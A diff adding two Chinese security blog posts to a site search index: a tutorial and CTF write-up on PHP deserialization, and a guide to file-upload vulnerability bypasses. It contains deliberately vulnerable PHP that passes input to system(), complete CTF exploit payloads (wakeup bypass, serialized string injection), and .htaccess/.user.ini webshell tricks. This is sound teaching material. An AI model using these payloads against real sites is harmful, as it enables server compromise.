@@ -1,6 +1,243 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>序列化和反序列化</title>
+    <url>/posts/2211845110.html</url>
+    <content><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>serialize()     &#x2F;&#x2F;序列化:将变量转换为可保存或传输的字符串的过程；<br>unserialize()   &#x2F;&#x2F;反序列化:在适当的时候把这个字符串再转化成原来的变量使用。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&#x27;ctf&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isAdmin</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">```  </span><br><span class="line">返回结果：`O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot; * name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;ctf&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot; User isAdmin&quot;</span>;b:<span class="number">1</span>;&#125;`  </span><br><span class="line">这里O代表对象，这里是序列化的一个对象，要序列化数组的就用A</span><br><span class="line"><span class="number">4</span>表示的是类的长度</span><br><span class="line">User表示是类名</span><br><span class="line"><span class="number">2</span>表示类里面有<span class="number">2</span>个属性，也称为变量</span><br><span class="line">s表示字符串的长度这里的 * name表示属性(注意*号两边有空格)</span><br><span class="line">比如s:<span class="number">7</span>:<span class="string">&quot; * name&quot;</span> 这里表示的是  * name属性名（变量名）为<span class="number">7</span>个字符串长度： 字符串 属性长度 属性值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 访问控制修饰符</span></span><br><span class="line"><span class="keyword">public</span>（公有）：可以被任何类访问，没有限制。  </span><br><span class="line"><span class="keyword">protected</span>（受保护）：只能被其自身类、子类和父类访问。  </span><br><span class="line"><span class="keyword">private</span>（私有）：只能被其自身类访问，其他类无法直接访问。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**注意：**访问控制修饰符不同，序列化后属性的长度和属性值会有所不同：</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>：属性被序列化的时候属性值会变成---`属性名`  </span><br><span class="line"><span class="keyword">protected</span>：属性被序列化的时候属性值会变成---`\x00*\x00属性名`  </span><br><span class="line"><span class="keyword">private</span>：属性被序列化的时候属性值会变成---`\x00类名\x00属性名`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 魔术方法：  </span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__construct</span>()， <span class="title function_ invoke__">__destruct</span>()， <span class="title function_ invoke__">__call</span>()， <span class="title function_ invoke__">__callStatic</span>()， <span class="title function_ invoke__">__get</span>()， <span class="title function_ invoke__">__set</span>()， <span class="title function_ invoke__">__isset</span>()， <span class="title function_ invoke__">__unset</span>()，<span class="title function_ invoke__">__sleep</span>()， <span class="title function_ invoke__">__wakeup</span>()， <span class="title function_ invoke__">__toString</span>()， <span class="title function_ invoke__">__invoke</span>()， <span class="title function_ invoke__">__set_state</span>()， <span class="title function_ invoke__">__clone</span>() 和 <span class="title function_ invoke__">__debugInfo</span>() 等方法在 PHP 中被称为<span class="string">&quot;魔术方法&quot;</span>（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>…… &#x2F;&#x2F;构造class的代码省略<br>$u1 &#x3D; new User();     （1）<br>$s &#x3D; serialize($u1);     （2）<br>echo $s . “<br>”;      （3）</p>
+<p>$o &#x3D; unserialize($s);    （4）<br>echo $o;             （5）</p>
+<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span>) 在代码执行第一步时会调用<span class="built_in">__construct</span>()方法，在程序结束后会自动执行<span class="built_in">__destruct</span>()方法  </span><br><span class="line"><span class="number">2</span>) 在执行<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>时，会在<span class="built_in">__construct</span>()和<span class="built_in">__destruct</span>()之间进行输出  </span><br><span class="line"><span class="number">3</span>) 在执行<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span>时，在执行第四步之前，会先执行<span class="built_in">__wakeup</span>()方法，输出如下：  </span><br><span class="line">!<span class="selector-attr">[]</span>(serialize-unserialize/<span class="number">4</span>.png)  </span><br><span class="line">由于有两个对象，所以进行两次destruct进行销毁  </span><br><span class="line"><span class="number">4</span>) 在执行<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span>，<span class="number">5</span>时，会在<span class="built_in">__wakeup</span>()方法后执行<span class="built_in">__toString</span>()方法，最后进行销毁。  </span><br><span class="line">所以我们可以得知关键魔术方法的执行顺序：<span class="built_in">__construct</span>() -&gt;<span class="built_in">__sleep</span>()*（在对象被序列化时调用）* -&gt; <span class="built_in">__wakeup</span>() -&gt; <span class="built_in">__toString</span>() -&gt; <span class="built_in">__destruct</span>()</span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## php序列化--任意命令执行</span><br><span class="line"></span><br><span class="line">漏洞代码示例：</span><br></pre></td></tr></table></figure>
+<?php
+class Test{
+    public $cmd = "whoami";
+    function __wakeup()
+    {
+        system($this->cmd);
+    }
+}
+$Obj = unserialize($_GET['cmd']);   //当unserialize运行，wakeup方法会自动执行，从而实现命令执行
+?>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">序列化字符串生成(`O:<span class="number">5</span>:<span class="string">&quot;Test1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;whoami&quot;</span>;&#125;`):</span><br></pre></td></tr></table></figure>
+<?php  
+class Test1{
+    public $cmd = "whoami";
+}
+$test = new Test1();
+echo serialize($test);
+?>
+<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">然后更改`<span class="number">6</span>:<span class="string">&quot;whoami&quot;</span>`这两个参数即可执行任意命令。</span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## ctf例题：web_php_unserialize</span><br><span class="line"></span><br><span class="line">![](serialize-unserialize/<span class="number">1.</span>png)</span><br><span class="line"></span><br><span class="line">这里对代码进行审计：</span><br></pre></td></tr></table></figure>
+<?php 
+class Demo { 
+    private $file = 'index.php';  //这里首先定义file的值为index.php
+    public function __construct($file) {   
+        $this->file = $file;  //构造函数 __construct 接受一个参数 $file，并将私有属性 $file 设置为传入的值，所以我们在设置payload的时候应把fl4g.php传入$file
+    }
+    function __destruct() { 
+        echo @highlight_file($this->file, true);   //在销毁对象时会自动调用，输出$file的值
+    }
+    function __wakeup() { 
+        if ($this->file != 'index.php') {  //如果file不为index.php,那么把file的值该回index.php,所以这里我们需要做的就是令wakeup方法不执行
+            //the secret is in the fl4g.php（自带的注释，提醒我们传入fl4g.php）
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+if (isset($_GET['var'])) {   
+    $var = base64_decode($_GET['var']);  //对$var进行base64解密，所以我们在设置payload时应该先进行base64加密再进行传参
+    if (preg_match('/[oc]:\d+:/i', $var)) {   //php正则匹配，防止对象注入，如果检测到像 {s:4:'flag'}这样的参数，那么就会终止程序
+        die('stop hacking!'); 
+    } else {
+        @unserialize($var);   //匹配失败则输出反序列化后的$var
+    } 
+} else { 
+    highlight_file("index.php");   //否则输出index.php
+} 
+?>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">所以构造payload,得到`O:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot; Demo file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;fl4g.php&quot;</span>;&#125;`,注意这里Demo file 中的Demo两边是有空格的:</span><br></pre></td></tr></table></figure>
+<?php
+file";s:8:"fl4g.php";}
+class Demo {
+    private $file = 'index.php';
+    public function __construct($file) {
+        $this->file = $file;
+    }
+    function __destruct(){
+        echo @highlight_file($this->file,true);
+    }
+    function __wakeup(){
+        if($this->file != 'index.php'){
+            $this->file = 'index.php';
+        }
+    }
+}
+$var = new Demo("fl4g.php");
+$o = serialize($var);
+echo $o;
+?>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">绕过正则匹配(数字前面加一个”+”号)：  </span><br><span class="line">`O:+<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot; Demo file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;fl4g.php&quot;</span>;&#125;`</span><br><span class="line"></span><br><span class="line">而要令wakeup方法不执行，就需要绕过wakeup方法，这里用到的是php的一个漏洞（CVE-<span class="number">2016</span>-<span class="number">7124</span>），把”Demo”后面的”<span class="number">1</span>”参数改为<span class="number">2</span>或者其他更大的整数：  </span><br><span class="line">`O:+<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot; Demo file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;fl4g.php&quot;</span>;&#125;`</span><br><span class="line"></span><br><span class="line">这里还要先对payload进行加密，于是得到完整的构造payload代码：  </span><br></pre></td></tr></table></figure>
+<?php
+class Demo {
+    private $file = 'index.php';
+    public function __construct($file) {
+        $this->file = $file;
+    }
+    function __destruct(){
+        echo @highlight_file($this->file,true);
+    }
+    function __wakeup(){
+        if($this->file != 'index.php'){
+            $this->file = 'index.php';
+        }
+    }
+}
+$var = new Demo("fl4g.php");
+$o = serialize($var);
+echo $o;
+$str1 = str_replace(":4:",":+4:",$o);
+$str2 = str_replace(":1:",":2:",$str1);
+$str3 = base64_encode($str2);
+var_dump($str3);
+?>
+<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">得到最终payload，`Tzor<span class="symbol">NDoiRGVtbyI6</span>Mjp<span class="number">7</span>czoxMDoiAERlbW<span class="number">8</span>AZmlsZSI<span class="number">7</span>cz<span class="meta">o4</span>OiJmbDR<span class="symbol">nLnBocCI7</span>fQ==`，输入到网页得到flag</span><br><span class="line">![]<span class="comment">(serialize-unserialize/2.png)</span></span><br><span class="line"></span><br><span class="line">![]<span class="comment">(serialize-unserialize/3.png)</span></span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">## ctf例题：easy_serialize_php1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![]<span class="comment">(serialize-unserialize/6.png)</span></span><br><span class="line"></span><br><span class="line">代码审计：  </span><br></pre></td></tr></table></figure>
+<?php
+
+$function = @$_GET['f'];
+
+function filter($img){
+    $filter_arr = array('php','flag','php5','php4','fl1g');
+    $filter = '/'.implode('|',$filter_arr).'/i';  
+    //implode函数将数组用"|"组合成字符串，在生成的字符串的前后各加一个 '/'，将其变成一个正则表达式，i意味着不区分大小写
+    return preg_replace($filter,'',$img);  
+    //preg_replace 函数会在 $img 中查找匹配 $filter 的内容，并将其替换为空字符串。
+}
+
+
+if($_SESSION){
+    unset($_SESSION);  
+    //$_SESSION 是一个用来存储会话数据的超全局数组，在 PHP 中经常用于跨页面传递数据。如果会话存在则清空会话数据
+}
+
+$_SESSION["user"] = 'guest'; 
+$_SESSION['function'] = $function; 
+
+extract($_POST); 
+//根据extract()我们可以进行变量覆盖，当我们POST传入SESSION[flag]=123时，$SESSION["user"]和$SESSION['function'] 全部会消失，只剩下SESSION[flag]=123。
+
+if(!$function){  //$function为空则页面回到初始
+    echo '<a href="index.php?f=highlight_file">source_code';
+}
+
+if(!$_GET['img_path']){   //这里可以更改$_GET['img_path']或使$_GET['img_path']为空来达到读取flag的目的，我们选择使$_GET['img_path']为空
+    $_SESSION['img'] = base64_encode('guest_img.png');   //如果$_GET['img_path']为空，则执行
+}else{
+    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));   
+}
+
+$serialize_info = filter(serialize($_SESSION));
+
+if($function == 'highlight_file'){
+    highlight_file('index.php');
+}else if($function == 'phpinfo'){
+    eval('phpinfo();'); //maybe you can find something in here!
+}else if($function == 'show_image'){   //只有当function的值为show_image时，才能对$serialize_info进行反序列化和其他后续的操作。
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo['img']));
+} 
+?>
+<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">将<span class="function"><span class="keyword">function</span>设置成<span class="title">phpinfo</span>，得到<span class="title">flag</span>信息：</span></span><br><span class="line"><span class="function">![]<span class="params">(serialize-unserialize/5.png)</span></span></span><br><span class="line"></span><br><span class="line">首先要知道我们需要序列化user，<span class="function"><span class="keyword">function</span>，<span class="title">img</span>。</span></span><br></pre></td></tr></table></figure>
+<p>$_SESSION[“user”] &#x3D; ‘guest’;<br>$_SESSION[‘function’] &#x3D; $function;<br>$_SESSION[‘img’]&#x3D;base64_encode(‘guest_img.png’);</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">构建代码输出序列化内容</span><br></pre></td></tr></table></figure>
+<?php
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] = 'z';
+$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';  //d0g3_f1ag.php base64编码
+var_dump(serialize($_SESSION));
+?>
+<p>&#x2F;&#x2F;得到string(90) “a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;s:1:”z”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;}”</p>
+<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">**注意：**序列化之后长度s获取的字符串的长度一定为s，否则会继续往后读，并且unserialize会把多余的字符串当垃圾处理，在</span><span class="template-variable">&#123;&#125;</span><span class="language-xml">内的就是正确的，</span><span class="template-variable">&#123;&#125;</span><span class="language-xml">后面的就都被丢弃。  </span></span><br><span class="line"><span class="language-xml">所以我们的目的是把`$_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);`这段代码的img属性放到</span><span class="template-variable">&#123;&#125;</span><span class="language-xml">外，然后在</span><span class="template-variable">&#123;&#125;</span><span class="language-xml">中注好新的img属性，于是他本来要求的img属性就被替换了。  </span></span><br></pre></td></tr></table></figure>
+<?php
+$_SESSION["user"] = 'flagflagflagflagflagphp';  //user里的内容会被过滤掉，然后会接着往后取23个字符
+$_SESSION['function'] = '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:2:"bb";}';
+$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';     //d0g3_f1ag.php base64编码
+var_dump(serialize($_SESSION));
+?>
+<pre><code>得到  `a:3:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:57:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;1&quot;;s:1:&quot;2&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;`  
+&#125;  
+经过删除和过滤后，于是剩下(其中 *&quot;;s:8:&quot;function&quot;;s:57:&quot;* 是user的键值，而 *s:1:&quot;a&quot;;s:2:&quot;bb&quot;;* 是作为第3个序列化数组凑数的):  
+  `a:3:&#123;s:4:&quot;user&quot;;s:23:&quot;&quot;;s:8:&quot;function&quot;;s:57:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:2:&quot;bb&quot;;&#125;`
+
+构造payload：  
+`_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[function]=&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:2:&quot;bb&quot;;&#125;`  
+得到了flag的所在
+![](serialize-unserialize/7.png)
+
+获取`/d0g3_fllllllag`的base64加密值`L2QwZzNfZmxsbGxsbGFn`（刚好也是20位），填入payload，得到最终payload：  
+`_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[function]=&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:2:&quot;bb&quot;;&#125;`   
+取得flag
+![](serialize-unserialize/8.png)
+</code></pre>
+]]></content>
+      <categories>
+        <category>web攻防</category>
+      </categories>
+      <tags>
+        <tag>web攻防</tag>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞</title>
+    <url>/posts/154257042.html</url>
+    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。</p>
+<span id="more"></span>
+<h2 id="1、前端验证"><a href="#1、前端验证" class="headerlink" title="1、前端验证"></a>1、前端验证</h2><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;form enctype<span class="operator">=</span><span class="string">&quot;multipart/form-data&quot;</span> method<span class="operator">=</span><span class="string">&quot;post&quot;</span> onsubmit<span class="operator">=</span><span class="string">&quot;return checkFile()&quot;</span>&gt;</span><br><span class="line">             &lt;p&gt;请选择要上传的图片：&lt;/p&gt;&lt;p&gt;</span><br><span class="line">             &lt;input class<span class="operator">=</span><span class="string">&quot;input_file&quot;</span> type<span class="operator">=</span><span class="string">&quot;file&quot;</span> name<span class="operator">=</span><span class="string">&quot;upload_file&quot;</span>&gt;</span><br><span class="line">             &lt;input class<span class="operator">=</span><span class="string">&quot;button&quot;</span> type<span class="operator">=</span><span class="string">&quot;submit&quot;</span> name<span class="operator">=</span><span class="string">&quot;submit&quot;</span> value<span class="operator">=</span><span class="string">&quot;上传&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">         &lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>表单中使用onsumbit&#x3D;”return checkFile()”调用js函数来检查上传文件的扩展名。当用户在<strong>客户端</strong>选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为<strong>前台脚本检测扩展名</strong>。</p>
+<p><strong>绕过方法</strong>：<br>1、在浏览器中审查元素，删除检测函数<br>2、通过改包软件将修改后缀名再上传<br>3、浏览器安装插件禁用JS<br><br></p>
+<h2 id="2、后端验证"><a href="#2、后端验证" class="headerlink" title="2、后端验证"></a>2、后端验证</h2><p>在文件被上传到<strong>服务端</strong>的时候，对文件内容、大小和类型进行检测等。</p>
+<h3 id="2-1-基于MIME-文件类型检测"><a href="#2-1-基于MIME-文件类型检测" class="headerlink" title="2.1 基于MIME(文件类型检测)"></a>2.1 基于MIME(文件类型检测)</h3><p><strong>常见类型</strong>：<br><img src="/posts/154257042/1.png"></p>
+<p><strong>绕过方法</strong>：<br>使用工具（如burpsuite）强行篡改Header就可以，将Content-Type: application&#x2F;php改为对应的类型。</p>
+<h3 id="2-2-基于后缀"><a href="#2-2-基于后缀" class="headerlink" title="2.2 基于后缀"></a>2.2 基于后缀</h3><p>通过检查文件的扩展名来确定文件<strong>类型</strong>，如果扩展名与允许上传的类型匹配，则系统允许上传；否则，系统可能会拒绝上传或发出警告。</p>
+<h4 id="2-2-1-黑名单验证"><a href="#2-2-1-黑名单验证" class="headerlink" title="2.2.1 黑名单验证"></a>2.2.1 黑名单验证</h4><p>文件扩展名在黑名单中的为不合法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_blacklisted</span>(<span class="params">filename</span>):</span><br><span class="line">    blacklisted_extensions = [<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;.bat&#x27;</span>, <span class="string">&#x27;.cmd&#x27;</span>, <span class="string">&#x27;.sh&#x27;</span>]  <span class="comment"># 黑名单扩展名列表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查文件名中是否包含黑名单扩展名</span></span><br><span class="line">    <span class="keyword">for</span> extension <span class="keyword">in</span> blacklisted_extensions:</span><br><span class="line">        <span class="keyword">if</span> filename.lower().endswith(extension):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 如果文件名以黑名单扩展名结尾，则返回True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 如果文件名不包含黑名单扩展名，则返回False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试代码</span></span><br><span class="line">filename = <span class="string">&quot;example.exe&quot;</span></span><br><span class="line"><span class="keyword">if</span> is_blacklisted(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传失败，文件类型在黑名单中。&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传成功。&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>黑名单的绕过方法</strong>在这里简单概括一下，后面会有较为详细的解释。<br><strong>Windows系统：</strong><br>1、尝试可逆未限制但可以执行的其他脚本后缀<br>2、大小写绕过<br>3、双写绕过<br>4、末尾添加.绕过<br>5、末尾添加空格绕过<br>6、末尾添加::$DATA绕过<br>7、截断上传<br>8、竞争上传<br>9、.htaccess文件上传<br>10、上传图片马结合文件包含  </p>
+<p><strong>Linux系统：</strong><br>1、尝试可逆未限制但可以执行的其他脚本后缀<br>2、双写绕过<br>3、截断上传<br>4、竞争上传<br>5、.htaccess文件上传<br>6、上传图片马结合文件包含</p>
+<h4 id="2-2-2-白名单验证"><a href="#2-2-2-白名单验证" class="headerlink" title="2.2.2 白名单验证"></a>2.2.2 白名单验证</h4><p>文件扩展名不在白名单中的均为不合法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_whitelisted</span>(<span class="params">filename</span>):</span><br><span class="line">    whitelisted_extensions = [<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>]  <span class="comment"># 白名单扩展名列表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查文件名中是否包含白名单扩展名</span></span><br><span class="line">    <span class="keyword">for</span> extension <span class="keyword">in</span> whitelisted_extensions:</span><br><span class="line">        <span class="keyword">if</span> filename.lower().endswith(extension):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 如果文件名以白名单扩展名结尾，则返回True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 如果文件名不包含白名单扩展名，则返回False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试代码</span></span><br><span class="line">filename = <span class="string">&quot;example.jpg&quot;</span></span><br><span class="line"><span class="keyword">if</span> is_whitelisted(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传成功。&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传失败，文件类型不在白名单中。&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>白名单的绕过方法</strong>简单概括：<br>1、结合解析漏洞<br>2、截断上传<br>3、文件名长度绕过<br>4、.htaccess文件上传<br>5、上传zip马结合文件包含</p>
+<h4 id="2-2-3-配置文件上传-htaccess-user-ini"><a href="#2-2-3-配置文件上传-htaccess-user-ini" class="headerlink" title="2.2.3 配置文件上传(.htaccess &#x2F; .user.ini)"></a>2.2.3 配置文件上传(.htaccess &#x2F; .user.ini)</h4><p><code>.htaccess：</code><br>.htaccess是Apache Web服务器上的一个配置文件，用于配置服务器的行为，如URL重写、访问控制、重定向等。<br>其中.htaccess文件内容：SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错</p>
+<p>但.htaccess文件可用的前提是管理员在http.conf文件中设置 AllowOverried All。<br><img src="/posts/154257042/5.png"></p>
+<p>如果代码没有对htaccess进行过滤，那么可以直接上传.htaccess来设置使用php解析任意文件。<br>创建txt文件输入以下代码，然后改为1.jpg,上传时抓包将filename改回.htaccess即可</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">//</span> <span class="string">&quot;\.jpg&quot;</span>为要上传的shell的文件名</span><br><span class="line">&lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt; </span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;<span class="string">/FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>上传成功后再将图片马上传就可以连接蚁剑了</p>
+<p><strong>局限:</strong><br>.htaccess的配置文件只能在Apache服务器中起作用<br>下面介绍另一个配置文件</p>
+<hr>
+
+<p><code>.user.ini</code><br>php.ini是php的全局配置文件，对整个web服务起作用，.user.ini和.htaccess都是目录的配置文件，.user.ini是用户自定义的php.ini，通常构造后门和隐藏后门。</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">GIF89a                  <span class="comment">//绕过exif_imagetype()</span></span><br><span class="line"><span class="built_in">auto</span>_prepend_file=<span class="number">1.</span>jpg <span class="comment">//指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。它包含在所有php文件前先执行</span></span><br><span class="line"><span class="built_in">auto</span>_append_file=<span class="number">1.</span>jpg  <span class="comment">//解析后进行包含，它包含在所有php文件执行后执行</span></span><br></pre></td></tr></table></figure>
+<p>假设某网站限制上传php文件，但是可以上传.user.ini，在上传一个图片马，然后可以通过访问含有.user.ini的文件夹下的php文件进行连接蚁剑。</p>
+<h4 id="2-2-4-截断上传"><a href="#2-2-4-截断上传" class="headerlink" title="2.2.4 截断上传"></a>2.2.4 截断上传</h4><p>首先明确php中00截断的条件：<br>1、php版本小于5.3.29<br>2、magic_quotes_gpc &#x3D; Off  </p>
+<p>无论<strong>0x00</strong>还是**%00<strong>，最终被解析后都是chr（0），而chr（0）返回的就是一个空格，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。那么绕过是怎样发生的呢？<br>如：在通过抓包软件将文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php，但是这样只能绕过前端验证，由于后端验证一般是通过文件上传路径来获取文件后缀的，直接截断是没有所以如果要绕过后端验证，则需要满足两个条件之一：<br>1、</strong>文件路径可控<strong>，比如我可以修改路径拼接的path时，比如抓到的包中存在path: uploads&#x2F;，就可以直接把路径构造成uploads&#x2F;xxx.php%00<br>2、路径拼接直接</strong>使用 $file_name**这个文件名，而不是 $file_ext和其他什么东西来拼成一个文件名字，这时文件名中还是包含截断字符的。</p>
+<h4 id="2-2-5-条件竞争"><a href="#2-2-5-条件竞争" class="headerlink" title="2.2.5 条件竞争"></a>2.2.5 条件竞争</h4><h4 id="2-2-6-二次渲染"><a href="#2-2-6-二次渲染" class="headerlink" title="2.2.6 二次渲染"></a>2.2.6 二次渲染</h4><h4 id="2-2-7-结合解析漏洞"><a href="#2-2-7-结合解析漏洞" class="headerlink" title="2.2.7 结合解析漏洞"></a>2.2.7 结合解析漏洞</h4><h4 id="2-2-8-上传zip马结合文件包含"><a href="#2-2-8-上传zip马结合文件包含" class="headerlink" title="2.2.8 上传zip马结合文件包含"></a>2.2.8 上传zip马结合文件包含</h4><p>在白名单内只允许上传zip文件时，可以将php文件放入zip内，注意压缩方式为<strong>存储</strong>。<br><img src="/posts/154257042/3.png"></p>
+<p>在上传zip文件后，使用文件包含伪协议进行运行<br>zip:&#x2F;&#x2F; （压缩流）<br>phar:&#x2F;&#x2F; （PHP归档)<br>    <a href="http://127.0.0.1/include.php?file=zip://uploads/phpinfo.zip%23phpinfo">http://127.0.0.1/include.php?file=zip://uploads/phpinfo.zip%23phpinfo</a><br>    <a href="http://127.0.0.1/include.php?file=phar://./uploads/phpinfo.zip/phpinfo">http://127.0.0.1/include.php?file=phar://./uploads/phpinfo.zip/phpinfo</a><br>其中phpinfo.zip是所上传的压缩包，phpinfo是压缩包内的文件名，如果源代码中没有include <strong>php</strong>后缀的话，需要在伪协议代码后自行添加.php<br>如果include 的是jpg后缀，那么将压缩包内的文件也对应改成jpg即可<br><img src="/posts/154257042/4.png"></p>
